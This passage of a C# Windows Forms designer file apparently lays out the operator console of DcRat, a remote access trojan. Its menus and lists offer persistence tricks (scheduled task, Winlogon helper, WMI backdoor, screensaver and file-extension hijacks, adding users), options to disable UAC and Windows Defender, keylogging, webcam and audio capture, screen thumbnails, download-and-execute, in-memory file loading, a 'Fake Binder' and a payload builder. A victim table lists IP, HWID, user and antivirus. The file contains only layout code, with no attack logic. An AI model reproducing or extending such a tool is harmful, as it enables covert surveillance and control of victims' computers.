            this.startUpToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.installToolStripMenuItem2,
            this.uninstallToolStripMenuItem2});
            this.startUpToolStripMenuItem.Name = "startUpToolStripMenuItem";
            this.startUpToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.startUpToolStripMenuItem.Text = "StartUp";
            // 
            // installToolStripMenuItem2
            // 
            this.installToolStripMenuItem2.Name = "installToolStripMenuItem2";
            this.installToolStripMenuItem2.Size = new System.Drawing.Size(137, 22);
            this.installToolStripMenuItem2.Text = "Install";
            this.installToolStripMenuItem2.Click += new System.EventHandler(this.installToolStripMenuItem2_Click);
            // 
            // uninstallToolStripMenuItem2
            // 
            this.uninstallToolStripMenuItem2.Name = "uninstallToolStripMenuItem2";
            this.uninstallToolStripMenuItem2.Size = new System.Drawing.Size(137, 22);
            this.uninstallToolStripMenuItem2.Text = "Uninstall";
            this.uninstallToolStripMenuItem2.Click += new System.EventHandler(this.uninstallToolStripMenuItem2_Click);
            // 
            // schtaskToolStripMenuItem
            // 
            this.schtaskToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.installToolStripMenuItem1,
            this.uninstallToolStripMenuItem1});
            this.schtaskToolStripMenuItem.Name = "schtaskToolStripMenuItem";
            this.schtaskToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.schtaskToolStripMenuItem.Text = "Schtask";
            // 
            // installToolStripMenuItem1
            // 
            this.installToolStripMenuItem1.Name = "installToolStripMenuItem1";
            this.installToolStripMenuItem1.Size = new System.Drawing.Size(137, 22);
            this.installToolStripMenuItem1.Text = "Install";
            this.installToolStripMenuItem1.Click += new System.EventHandler(this.installToolStripMenuItem1_Click);
            // 
            // uninstallToolStripMenuItem1
            // 
            this.uninstallToolStripMenuItem1.Name = "uninstallToolStripMenuItem1";
            this.uninstallToolStripMenuItem1.Size = new System.Drawing.Size(137, 22);
            this.uninstallToolStripMenuItem1.Text = "Uninstall";
            this.uninstallToolStripMenuItem1.Click += new System.EventHandler(this.uninstallToolStripMenuItem1_Click);
            // 
            // userAddToolStripMenuItem
            // 
            this.userAddToolStripMenuItem.Name = "userAddToolStripMenuItem";
            this.userAddToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.userAddToolStripMenuItem.Text = "UserAdd";
            this.userAddToolStripMenuItem.Click += new System.EventHandler(this.userAddToolStripMenuItem_Click);
            // 
            // winlogonHelperToolStripMenuItem
            // 
            this.winlogonHelperToolStripMenuItem.Name = "winlogonHelperToolStripMenuItem";
            this.winlogonHelperToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.winlogonHelperToolStripMenuItem.Text = "WinlogonHelper";
            this.winlogonHelperToolStripMenuItem.Click += new System.EventHandler(this.winlogonHelperToolStripMenuItem_Click);
            // 
            // hijackDefaultExtToolStripMenuItem
            // 
            this.hijackDefaultExtToolStripMenuItem.Name = "hijackDefaultExtToolStripMenuItem";
            this.hijackDefaultExtToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.hijackDefaultExtToolStripMenuItem.Text = "HijackDefaultExt";
            this.hijackDefaultExtToolStripMenuItem.Click += new System.EventHandler(this.hijackDefaultExtToolStripMenuItem_Click);
            // 
            // hijackScrnSaverToolStripMenuItem
            // 
            this.hijackScrnSaverToolStripMenuItem.Name = "hijackScrnSaverToolStripMenuItem";
            this.hijackScrnSaverToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.hijackScrnSaverToolStripMenuItem.Text = "HijackScrnSaver";
            this.hijackScrnSaverToolStripMenuItem.Click += new System.EventHandler(this.hijackScrnSaverToolStripMenuItem_Click);
            // 
            // wMIBackdoorToolStripMenuItem
            // 
            this.wMIBackdoorToolStripMenuItem.Name = "wMIBackdoorToolStripMenuItem";
            this.wMIBackdoorToolStripMenuItem.Size = new System.Drawing.Size(186, 22);
            this.wMIBackdoorToolStripMenuItem.Text = "WMI Backdoor";
            this.wMIBackdoorToolStripMenuItem.Click += new System.EventHandler(this.wMIBackdoorToolStripMenuItem_Click);
            // 
            // RemoteControlToolStripMenuItem
            // 
            this.RemoteControlToolStripMenuItem.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.SendFileToolStripMenuItem1,
            this.VisteWebsiteToolStripMenuItem1,
            this.FileSearchToolStripMenuItem,
            this.remoteCameraToolStripMenuItem1,
            this.recordToolStripMenuItem1,
            this.programNotificationToolStripMenuItem1});
            this.RemoteControlToolStripMenuItem.Name = "RemoteControlToolStripMenuItem";
            this.RemoteControlToolStripMenuItem.Size = new System.Drawing.Size(151, 22);
            this.RemoteControlToolStripMenuItem.Text = "Extra";
            // 
            // SendFileToolStripMenuItem1
            // 
            this.SendFileToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.fromUrlToolStripMenuItem,
            this.SendFileToDiskToolStripMenuItem,
            this.SendFileToMemoryToolStripMenuItem});
            this.SendFileToolStripMenuItem1.Name = "SendFileToolStripMenuItem1";
            this.SendFileToolStripMenuItem1.Size = new System.Drawing.Size(214, 22);
            this.SendFileToolStripMenuItem1.Text = "Send File";
            // 
            // fromUrlToolStripMenuItem
            // 
            this.fromUrlToolStripMenuItem.Name = "fromUrlToolStripMenuItem";
            this.fromUrlToolStripMenuItem.Size = new System.Drawing.Size(207, 22);
            this.fromUrlToolStripMenuItem.Text = "From Url";
            this.fromUrlToolStripMenuItem.Click += new System.EventHandler(this.fromUrlToolStripMenuItem_Click);
            // 
            // SendFileToDiskToolStripMenuItem
            // 
            this.SendFileToDiskToolStripMenuItem.Name = "SendFileToDiskToolStripMenuItem";
            this.SendFileToDiskToolStripMenuItem.Size = new System.Drawing.Size(207, 22);
            this.SendFileToDiskToolStripMenuItem.Text = "Send File To Disk";
            this.SendFileToDiskToolStripMenuItem.Click += new System.EventHandler(this.SendFileToDiskToolStripMenuItem_Click);
            // 
            // SendFileToMemoryToolStripMenuItem
            // 
            this.SendFileToMemoryToolStripMenuItem.Name = "SendFileToMemoryToolStripMenuItem";
            this.SendFileToMemoryToolStripMenuItem.Size = new System.Drawing.Size(207, 22);
            this.SendFileToMemoryToolStripMenuItem.Text = "Send File To Memory";
            this.SendFileToMemoryToolStripMenuItem.Click += new System.EventHandler(this.SendFileToMemoryToolStripMenuItem_Click);
            // 
            // VisteWebsiteToolStripMenuItem1
            // 
            this.VisteWebsiteToolStripMenuItem1.Name = "VisteWebsiteToolStripMenuItem1";
            this.VisteWebsiteToolStripMenuItem1.Size = new System.Drawing.Size(214, 22);
            this.VisteWebsiteToolStripMenuItem1.Text = "Viste Website";
            this.VisteWebsiteToolStripMenuItem1.Click += new System.EventHandler(this.VisteWebsiteToolStripMenuItem1_Click);
            // 
            // FileSearchToolStripMenuItem
            // 
            this.FileSearchToolStripMenuItem.Name = "FileSearchToolStripMenuItem";
            this.FileSearchToolStripMenuItem.Size = new System.Drawing.Size(214, 22);
            this.FileSearchToolStripMenuItem.Text = "File Search";
            this.FileSearchToolStripMenuItem.Click += new System.EventHandler(this.FileSearchToolStripMenuItem_Click);
            // 
            // remoteCameraToolStripMenuItem1
            // 
            this.remoteCameraToolStripMenuItem1.Name = "remoteCameraToolStripMenuItem1";
            this.remoteCameraToolStripMenuItem1.Size = new System.Drawing.Size(214, 22);
            this.remoteCameraToolStripMenuItem1.Text = "Remote Camera";
            this.remoteCameraToolStripMenuItem1.Click += new System.EventHandler(this.remoteCameraToolStripMenuItem1_Click);
            // 
            // recordToolStripMenuItem1
            // 
            this.recordToolStripMenuItem1.Name = "recordToolStripMenuItem1";
            this.recordToolStripMenuItem1.Size = new System.Drawing.Size(214, 22);
            this.recordToolStripMenuItem1.Text = "Audio Record";
            this.recordToolStripMenuItem1.Click += new System.EventHandler(this.recordToolStripMenuItem1_Click);
            // 
            // programNotificationToolStripMenuItem1
            // 
            this.programNotificationToolStripMenuItem1.DropDownItems.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.startToolStripMenuItem3,
            this.stopToolStripMenuItem4});
            this.programNotificationToolStripMenuItem1.Name = "programNotificationToolStripMenuItem1";
            this.programNotificationToolStripMenuItem1.Size = new System.Drawing.Size(214, 22);
            this.programNotificationToolStripMenuItem1.Text = "Program Notification";
            // 
            // startToolStripMenuItem3
            // 
            this.startToolStripMenuItem3.Name = "startToolStripMenuItem3";
            this.startToolStripMenuItem3.Size = new System.Drawing.Size(109, 22);
            this.startToolStripMenuItem3.Text = "Start";
            this.startToolStripMenuItem3.Click += new System.EventHandler(this.startToolStripMenuItem3_Click);
            // 
            // stopToolStripMenuItem4
            // 
            this.stopToolStripMenuItem4.Name = "stopToolStripMenuItem4";
            this.stopToolStripMenuItem4.Size = new System.Drawing.Size(109, 22);
            this.stopToolStripMenuItem4.Text = "Stop";
            this.stopToolStripMenuItem4.Click += new System.EventHandler(this.stopToolStripMenuItem4_Click);
            // 
            // statusStrip1
            // 
            this.statusStrip1.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.statusStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.toolStripStatusLabel1,
            this.toolStripStatusLabel2});
            this.statusStrip1.Location = new System.Drawing.Point(0, 471);
            this.statusStrip1.Name = "statusStrip1";
            this.statusStrip1.Padding = new System.Windows.Forms.Padding(1, 0, 10, 0);
            this.statusStrip1.Size = new System.Drawing.Size(1062, 22);
            this.statusStrip1.TabIndex = 1;
            this.statusStrip1.Text = "statusStrip1";
            // 
            // toolStripStatusLabel1
            // 
            this.toolStripStatusLabel1.Name = "toolStripStatusLabel1";
            this.toolStripStatusLabel1.Size = new System.Drawing.Size(17, 17);
            this.toolStripStatusLabel1.Text = "...";
            // 
            // toolStripStatusLabel2
            // 
            this.toolStripStatusLabel2.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.toolStripStatusLabel2.Name = "toolStripStatusLabel2";
            this.toolStripStatusLabel2.Size = new System.Drawing.Size(231, 17);
            this.toolStripStatusLabel2.Text = "                    Notification";
            this.toolStripStatusLabel2.Click += new System.EventHandler(this.ToolStripStatusLabel2_Click);
            // 
            // ping
            // 
            this.ping.Enabled = true;
            this.ping.Interval = 30000;
            this.ping.Tick += new System.EventHandler(this.ping_Tick);
            // 
            // UpdateUI
            // 
            this.UpdateUI.Enabled = true;
            this.UpdateUI.Interval = 500;
            this.UpdateUI.Tick += new System.EventHandler(this.UpdateUI_Tick);
            // 
            // contextMenuLogs
            // 
            this.contextMenuLogs.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.contextMenuLogs.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.contextMenuLogs.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.cLEARToolStripMenuItem});
            this.contextMenuLogs.Name = "contextMenuLogs";
            this.contextMenuLogs.ShowImageMargin = false;
            this.contextMenuLogs.Size = new System.Drawing.Size(85, 26);
            // 
            // cLEARToolStripMenuItem
            // 
            this.cLEARToolStripMenuItem.Name = "cLEARToolStripMenuItem";
            this.cLEARToolStripMenuItem.Size = new System.Drawing.Size(84, 22);
            this.cLEARToolStripMenuItem.Text = "Clear";
            this.cLEARToolStripMenuItem.Click += new System.EventHandler(this.CLEARToolStripMenuItem_Click);
            // 
            // contextMenuThumbnail
            // 
            this.contextMenuThumbnail.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.contextMenuThumbnail.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.contextMenuThumbnail.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.sTARTToolStripMenuItem,
            this.sTOPToolStripMenuItem});
            this.contextMenuThumbnail.Name = "contextMenuStrip2";
            this.contextMenuThumbnail.Size = new System.Drawing.Size(110, 48);
            // 
            // sTARTToolStripMenuItem
            // 
            this.sTARTToolStripMenuItem.ForeColor = System.Drawing.SystemColors.ControlText;
            this.sTARTToolStripMenuItem.Name = "sTARTToolStripMenuItem";
            this.sTARTToolStripMenuItem.Size = new System.Drawing.Size(109, 22);
            this.sTARTToolStripMenuItem.Text = "Start";
            this.sTARTToolStripMenuItem.Click += new System.EventHandler(this.STARTToolStripMenuItem_Click);
            // 
            // sTOPToolStripMenuItem
            // 
            this.sTOPToolStripMenuItem.Name = "sTOPToolStripMenuItem";
            this.sTOPToolStripMenuItem.Size = new System.Drawing.Size(109, 22);
            this.sTOPToolStripMenuItem.Text = "Stop";
            this.sTOPToolStripMenuItem.Click += new System.EventHandler(this.STOPToolStripMenuItem_Click);
            // 
            // ThumbnailImageList
            // 
            this.ThumbnailImageList.ColorDepth = System.Windows.Forms.ColorDepth.Depth16Bit;
            this.ThumbnailImageList.ImageSize = new System.Drawing.Size(256, 256);
            this.ThumbnailImageList.TransparentColor = System.Drawing.Color.Transparent;
            // 
            // contextMenuTasks
            // 
            this.contextMenuTasks.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.contextMenuTasks.ImageScalingSize = new System.Drawing.Size(24, 24);
            this.contextMenuTasks.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.sendFileFromUrlToolStripMenuItem,
            this.downloadAndExecuteToolStripMenuItem,
            this.sENDFILETOMEMORYToolStripMenuItem1,
            this.disableUACToolStripMenuItem1,
            this.disableWDToolStripMenuItem1,
            this.installSchtaskToolStripMenuItem,
            this.uPDATEToolStripMenuItem1,
            this.autoKeyloggerToolStripMenuItem,
            this.fakeBinderToolStripMenuItem,
            this.toolStripSeparator4,
            this.dELETETASKToolStripMenuItem});
            this.contextMenuTasks.Name = "contextMenuStrip4";
            this.contextMenuTasks.ShowImageMargin = false;
            this.contextMenuTasks.Size = new System.Drawing.Size(183, 230);
            // 
            // sendFileFromUrlToolStripMenuItem
            // 
            this.sendFileFromUrlToolStripMenuItem.Name = "sendFileFromUrlToolStripMenuItem";
            this.sendFileFromUrlToolStripMenuItem.Size = new System.Drawing.Size(182, 22);
            this.sendFileFromUrlToolStripMenuItem.Text = "Send file from url";
            this.sendFileFromUrlToolStripMenuItem.Click += new System.EventHandler(this.sendFileFromUrlToolStripMenuItem_Click);
            // 
            // downloadAndExecuteToolStripMenuItem
            // 
            this.downloadAndExecuteToolStripMenuItem.Name = "downloadAndExecuteToolStripMenuItem";
            this.downloadAndExecuteToolStripMenuItem.Size = new System.Drawing.Size(182, 22);
            this.downloadAndExecuteToolStripMenuItem.Text = "Send file to disk";
            this.downloadAndExecuteToolStripMenuItem.Click += new System.EventHandler(this.DownloadAndExecuteToolStripMenuItem_Click);
            // 
            // sENDFILETOMEMORYToolStripMenuItem1
            // 
            this.sENDFILETOMEMORYToolStripMenuItem1.Name = "sENDFILETOMEMORYToolStripMenuItem1";
            this.sENDFILETOMEMORYToolStripMenuItem1.Size = new System.Drawing.Size(182, 22);
            this.sENDFILETOMEMORYToolStripMenuItem1.Text = "Send file to memory";
            this.sENDFILETOMEMORYToolStripMenuItem1.Click += new System.EventHandler(this.SENDFILETOMEMORYToolStripMenuItem1_Click);
            // 
            // disableUACToolStripMenuItem1
            // 
            this.disableUACToolStripMenuItem1.Name = "disableUACToolStripMenuItem1";
            this.disableUACToolStripMenuItem1.Size = new System.Drawing.Size(182, 22);
            this.disableUACToolStripMenuItem1.Text = "Disable UAC";
            this.disableUACToolStripMenuItem1.Click += new System.EventHandler(this.disableUACToolStripMenuItem1_Click);
            // 
            // disableWDToolStripMenuItem1
            // 
            this.disableWDToolStripMenuItem1.Name = "disableWDToolStripMenuItem1";
            this.disableWDToolStripMenuItem1.Size = new System.Drawing.Size(182, 22);
            this.disableWDToolStripMenuItem1.Text = "Disable WD";
            this.disableWDToolStripMenuItem1.Click += new System.EventHandler(this.disableWDToolStripMenuItem1_Click);
            // 
            // installSchtaskToolStripMenuItem
            // 
            this.installSchtaskToolStripMenuItem.Name = "installSchtaskToolStripMenuItem";
            this.installSchtaskToolStripMenuItem.Size = new System.Drawing.Size(182, 22);
            this.installSchtaskToolStripMenuItem.Text = "Install Schtask";
            this.installSchtaskToolStripMenuItem.Click += new System.EventHandler(this.installSchtaskToolStripMenuItem_Click);
            // 
            // uPDATEToolStripMenuItem1
            // 
            this.uPDATEToolStripMenuItem1.Name = "uPDATEToolStripMenuItem1";
            this.uPDATEToolStripMenuItem1.Size = new System.Drawing.Size(182, 22);
            this.uPDATEToolStripMenuItem1.Text = "Update all clients";
            this.uPDATEToolStripMenuItem1.Click += new System.EventHandler(this.UPDATEToolStripMenuItem1_Click);
            // 
            // autoKeyloggerToolStripMenuItem
            // 
            this.autoKeyloggerToolStripMenuItem.Name = "autoKeyloggerToolStripMenuItem";
            this.autoKeyloggerToolStripMenuItem.Size = new System.Drawing.Size(182, 22);
            this.autoKeyloggerToolStripMenuItem.Text = "Auto Keylogger";
            this.autoKeyloggerToolStripMenuItem.Click += new System.EventHandler(this.autoKeyloggerToolStripMenuItem_Click);
            // 
            // fakeBinderToolStripMenuItem
            // 
            this.fakeBinderToolStripMenuItem.Name = "fakeBinderToolStripMenuItem";
            this.fakeBinderToolStripMenuItem.Size = new System.Drawing.Size(182, 22);
            this.fakeBinderToolStripMenuItem.Text = "Fake Binder";
            this.fakeBinderToolStripMenuItem.Click += new System.EventHandler(this.fakeBinderToolStripMenuItem_Click);
            // 
            // toolStripSeparator4
            // 
            this.toolStripSeparator4.Name = "toolStripSeparator4";
            this.toolStripSeparator4.Size = new System.Drawing.Size(179, 6);
            // 
            // dELETETASKToolStripMenuItem
            // 
            this.dELETETASKToolStripMenuItem.Name = "dELETETASKToolStripMenuItem";
            this.dELETETASKToolStripMenuItem.Size = new System.Drawing.Size(182, 22);
            this.dELETETASKToolStripMenuItem.Text = "Delete";
            this.dELETETASKToolStripMenuItem.Click += new System.EventHandler(this.DELETETASKToolStripMenuItem_Click);
            // 
            // performanceCounter1
            // 
            this.performanceCounter1.CategoryName = "Processor";
            this.performanceCounter1.CounterName = "% Processor Time";
            this.performanceCounter1.InstanceName = "_Total";
            // 
            // performanceCounter2
            // 
            this.performanceCounter2.CategoryName = "Memory";
            this.performanceCounter2.CounterName = "% Committed Bytes In Use";
            // 
            // notifyIcon1
            // 
            this.notifyIcon1.Icon = ((System.Drawing.Icon)(resources.GetObject("notifyIcon1.Icon")));
            this.notifyIcon1.Text = "DcRat";
            this.notifyIcon1.Visible = true;
            // 
            // TimerTask
            // 
            this.TimerTask.Enabled = true;
            this.TimerTask.Interval = 5000;
            this.TimerTask.Tick += new System.EventHandler(this.TimerTask_Tick);
            // 
            // menuStrip1
            // 
            this.menuStrip1.Items.AddRange(new System.Windows.Forms.ToolStripItem[] {
            this.builderToolStripMenuItem1,
            this.blockToolStripMenuItem1,
            this.settingToolStripMenuItem1});
            this.menuStrip1.Location = new System.Drawing.Point(0, 0);
            this.menuStrip1.Name = "menuStrip1";
            this.menuStrip1.Padding = new System.Windows.Forms.Padding(7, 2, 0, 2);
            this.menuStrip1.Size = new System.Drawing.Size(1062, 24);
            this.menuStrip1.TabIndex = 4;
            this.menuStrip1.Text = "menuStrip1";
            // 
            // builderToolStripMenuItem1
            // 
            this.builderToolStripMenuItem1.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.builderToolStripMenuItem1.Name = "builderToolStripMenuItem1";
            this.builderToolStripMenuItem1.Size = new System.Drawing.Size(68, 20);
            this.builderToolStripMenuItem1.Text = "Builder";
            this.builderToolStripMenuItem1.Click += new System.EventHandler(this.builderToolStripMenuItem1_Click_1);
            // 
            // blockToolStripMenuItem1
            // 
            this.blockToolStripMenuItem1.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.blockToolStripMenuItem1.Name = "blockToolStripMenuItem1";
            this.blockToolStripMenuItem1.Size = new System.Drawing.Size(54, 20);
            this.blockToolStripMenuItem1.Text = "Block";
            this.blockToolStripMenuItem1.Click += new System.EventHandler(this.blockToolStripMenuItem1_Click);
            // 
            // settingToolStripMenuItem1
            // 
            this.settingToolStripMenuItem1.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.settingToolStripMenuItem1.Name = "settingToolStripMenuItem1";
            this.settingToolStripMenuItem1.Size = new System.Drawing.Size(68, 20);
            this.settingToolStripMenuItem1.Text = "Setting";
            this.settingToolStripMenuItem1.Click += new System.EventHandler(this.settingToolStripMenuItem1_Click);
            // 
            // splitContainer1
            // 
            this.splitContainer1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.splitContainer1.Location = new System.Drawing.Point(0, 24);
            this.splitContainer1.Margin = new System.Windows.Forms.Padding(4);
            this.splitContainer1.Name = "splitContainer1";
            this.splitContainer1.Orientation = System.Windows.Forms.Orientation.Horizontal;
            // 
            // splitContainer1.Panel1
            // 
            this.splitContainer1.Panel1.Controls.Add(this.tabControl1);
            // 
            // splitContainer1.Panel2
            // 
            this.splitContainer1.Panel2.Controls.Add(this.listView2);
            this.splitContainer1.Size = new System.Drawing.Size(1062, 447);
            this.splitContainer1.SplitterDistance = 260;
            this.splitContainer1.SplitterWidth = 5;
            this.splitContainer1.TabIndex = 5;
            // 
            // tabControl1
            // 
            this.tabControl1.Controls.Add(this.tabPage1);
            this.tabControl1.Controls.Add(this.tabPage3);
            this.tabControl1.Controls.Add(this.tabPage4);
            this.tabControl1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.tabControl1.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.tabControl1.Location = new System.Drawing.Point(0, 0);
            this.tabControl1.Margin = new System.Windows.Forms.Padding(2);
            this.tabControl1.Name = "tabControl1";
            this.tabControl1.SelectedIndex = 0;
            this.tabControl1.Size = new System.Drawing.Size(1062, 260);
            this.tabControl1.SizeMode = System.Windows.Forms.TabSizeMode.Fixed;
            this.tabControl1.TabIndex = 3;
            // 
            // tabPage1
            // 
            this.tabPage1.Controls.Add(this.listView1);
            this.tabPage1.Location = new System.Drawing.Point(4, 23);
            this.tabPage1.Margin = new System.Windows.Forms.Padding(2);
            this.tabPage1.Name = "tabPage1";
            this.tabPage1.Padding = new System.Windows.Forms.Padding(2);
            this.tabPage1.Size = new System.Drawing.Size(1054, 233);
            this.tabPage1.TabIndex = 0;
            this.tabPage1.Text = "Clients";
            // 
            // listView1
            // 
            this.listView1.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView1.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.lv_ip,
            this.lv_country,
            this.lv_group,
            this.lv_hwid,
            this.lv_user,
            this.lv_camera,
            this.lv_os,
            this.lv_version,
            this.lv_ins,
            this.lv_admin,
            this.lv_av,
            this.lv_ping,
            this.lv_act});
            this.listView1.ContextMenuStrip = this.contextMenuClient;
            this.listView1.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView1.FullRowSelect = true;
            this.listView1.GridLines = true;
            this.listView1.HideSelection = false;
            this.listView1.Location = new System.Drawing.Point(2, 2);
            this.listView1.Margin = new System.Windows.Forms.Padding(2);
            this.listView1.Name = "listView1";
            this.listView1.ShowGroups = false;
            this.listView1.ShowItemToolTips = true;
            this.listView1.Size = new System.Drawing.Size(1050, 229);
            this.listView1.TabIndex = 0;
            this.listView1.UseCompatibleStateImageBehavior = false;
            this.listView1.View = System.Windows.Forms.View.Details;
            this.listView1.ColumnClick += new System.Windows.Forms.ColumnClickEventHandler(this.ListView1_ColumnClick);
            this.listView1.KeyDown += new System.Windows.Forms.KeyEventHandler(this.listView1_KeyDown);
            this.listView1.MouseMove += new System.Windows.Forms.MouseEventHandler(this.listView1_MouseMove);
            // 
            // lv_ip
            // 
            this.lv_ip.Text = "IP Port";
            this.lv_ip.Width = 121;
            // 
            // lv_country
            // 
            this.lv_country.Text = "Country";
            this.lv_country.Width = 124;
            // 
            // lv_group
            // 
            this.lv_group.Text = "Group";
            // 
            // lv_hwid
            // 
            this.lv_hwid.Text = "HWID";
            this.lv_hwid.Width = 117;
            // 
            // lv_user
            // 
            this.lv_user.Text = "User";
            this.lv_user.Width = 117;
            // 
            // lv_camera
            // 
            this.lv_camera.Text = "Camera";
            // 
            // lv_os
            // 
            this.lv_os.Text = "OS version";
            this.lv_os.Width = 179;
            // 
            // lv_version
            // 
            this.lv_version.Text = "Client version";
            this.lv_version.Width = 126;
            // 
            // lv_ins
            // 
            this.lv_ins.Text = "Installed time";
            this.lv_ins.Width = 120;
            // 
            // lv_admin
            // 
            this.lv_admin.Text = "Permission";
            this.lv_admin.Width = 166;
            // 
            // lv_av
            // 
            this.lv_av.Text = "Anti-virus";
            this.lv_av.Width = 136;
            // 
            // lv_ping
            // 
            this.lv_ping.Text = "Ping";
            // 
            // lv_act
            // 
            this.lv_act.Text = "Activity Program";
            this.lv_act.Width = 350;
            // 
            // tabPage3
            // 
            this.tabPage3.Controls.Add(this.listView3);
            this.tabPage3.Location = new System.Drawing.Point(4, 23);
            this.tabPage3.Margin = new System.Windows.Forms.Padding(2);
            this.tabPage3.Name = "tabPage3";
            this.tabPage3.Size = new System.Drawing.Size(1054, 233);
            this.tabPage3.TabIndex = 2;
            this.tabPage3.Text = "Screens";
            this.tabPage3.UseVisualStyleBackColor = true;
            // 
            // listView3
            // 
            this.listView3.ContextMenuStrip = this.contextMenuThumbnail;
            this.listView3.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView3.HideSelection = false;
            this.listView3.LargeImageList = this.ThumbnailImageList;
            this.listView3.Location = new System.Drawing.Point(0, 0);
            this.listView3.Margin = new System.Windows.Forms.Padding(2);
            this.listView3.Name = "listView3";
            this.listView3.ShowItemToolTips = true;
            this.listView3.Size = new System.Drawing.Size(1054, 233);
            this.listView3.SmallImageList = this.ThumbnailImageList;
            this.listView3.TabIndex = 0;
            this.listView3.UseCompatibleStateImageBehavior = false;
            // 
            // tabPage4
            // 
            this.tabPage4.Controls.Add(this.listView4);
            this.tabPage4.Location = new System.Drawing.Point(4, 23);
            this.tabPage4.Margin = new System.Windows.Forms.Padding(2);
            this.tabPage4.Name = "tabPage4";
            this.tabPage4.Padding = new System.Windows.Forms.Padding(2);
            this.tabPage4.Size = new System.Drawing.Size(1054, 233);
            this.tabPage4.TabIndex = 3;
            this.tabPage4.Text = "Auto Task";
            this.tabPage4.UseVisualStyleBackColor = true;
            // 
            // listView4
            // 
            this.listView4.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView4.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader4,
            this.columnHeader5});
            this.listView4.ContextMenuStrip = this.contextMenuTasks;
            this.listView4.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView4.FullRowSelect = true;
            this.listView4.HideSelection = false;
            this.listView4.Location = new System.Drawing.Point(2, 2);
            this.listView4.Margin = new System.Windows.Forms.Padding(2);
            this.listView4.Name = "listView4";
            this.listView4.Size = new System.Drawing.Size(1050, 229);
            this.listView4.TabIndex = 0;
            this.listView4.UseCompatibleStateImageBehavior = false;
            this.listView4.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader4
            // 
            this.columnHeader4.Text = "Task";
            this.columnHeader4.Width = 97;
            // 
            // columnHeader5
            // 
            this.columnHeader5.Text = "Run times";
            this.columnHeader5.Width = 116;
            // 
            // listView2
            // 
            this.listView2.BorderStyle = System.Windows.Forms.BorderStyle.None;
            this.listView2.Columns.AddRange(new System.Windows.Forms.ColumnHeader[] {
            this.columnHeader1,
            this.columnHeader2});
            this.listView2.ContextMenuStrip = this.contextMenuLogs;
            this.listView2.Dock = System.Windows.Forms.DockStyle.Fill;
            this.listView2.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.listView2.FullRowSelect = true;
            this.listView2.GridLines = true;
            this.listView2.HideSelection = false;
            this.listView2.Location = new System.Drawing.Point(0, 0);
            this.listView2.Margin = new System.Windows.Forms.Padding(2);
            this.listView2.Name = "listView2";
            this.listView2.ShowGroups = false;
            this.listView2.ShowItemToolTips = true;
            this.listView2.Size = new System.Drawing.Size(1062, 182);
            this.listView2.TabIndex = 2;
            this.listView2.UseCompatibleStateImageBehavior = false;
            this.listView2.View = System.Windows.Forms.View.Details;
            // 
            // columnHeader1
            // 
            this.columnHeader1.Text = "Time";
            this.columnHeader1.Width = 150;
            // 
            // columnHeader2
            // 
            this.columnHeader2.Text = "Logs";
            this.columnHeader2.Width = 705;
            // 
            // ConnectTimeout
            // 
            this.ConnectTimeout.Enabled = true;
            this.ConnectTimeout.Interval = 5000;
            this.ConnectTimeout.Tick += new System.EventHandler(this.ConnectTimeout_Tick);
            // 
            // Form1
            // 
            this.AutoScaleDimensions = new System.Drawing.SizeF(7F, 14F);
            this.AutoScaleMode = System.Windows.Forms.AutoScaleMode.Font;
            this.ClientSize = new System.Drawing.Size(1062, 493);
            this.Controls.Add(this.splitContainer1);
            this.Controls.Add(this.statusStrip1);
            this.Controls.Add(this.menuStrip1);
            this.Font = new System.Drawing.Font("Consolas", 9F, System.Drawing.FontStyle.Regular, System.Drawing.GraphicsUnit.Point, ((byte)(0)));
            this.Icon = ((System.Drawing.Icon)(resources.GetObject("$this.Icon")));
            this.MainMenuStrip = this.menuStrip1;
